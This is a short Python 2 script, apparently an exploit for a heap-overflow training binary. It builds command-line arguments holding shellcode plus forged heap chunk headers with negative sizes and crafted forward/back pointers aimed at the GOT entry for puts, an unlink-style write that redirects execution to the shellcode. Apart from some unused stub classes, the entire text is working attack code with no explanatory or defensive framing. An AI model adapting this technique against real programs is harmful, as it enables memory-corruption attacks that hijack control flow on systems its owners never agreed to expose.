
import struct

def pack(val):
    return struct.pack("<I", val)

class HeapFrame():
    pass

class HeapMetadata():
    pass

class HeapHelper():
    def __init__(self, destination, source):
        print "Note: Make sure source+8 is writable"
        self.dest = destination
        self.sources = source

    def get_crafted_block(self):
        metadata = HeapMetadata()
        crafted_frame = HeapFrame()
        return metadata, crafted_frame


GOT_PUTS = 0x0804b128
SC = 0x804c008 + 8

arg1 = "A" * 8 + "\x68\x64\x88\x04\x08\xC3" + "AAAA"

PREV_SIZE_C = pack(0xfffffff8)
SIZE_C = pack(0xfffffff0)
arg2 = "A" * 16 + pack(0xfffffff0) + pack(0xfffffff8) + "A"*8 + PREV_SIZE_C + SIZE_C

CR_PREV_SIZE = pack(0xfffffff0)
CR_SIZE = pack(0xfffffff1)
FD = pack(GOT_PUTS-12)
BK = pack(SC)
arg3 = CR_PREV_SIZE + CR_SIZE + FD + BK + "A"*100

print arg1 + " " + arg2 + " " + arg3


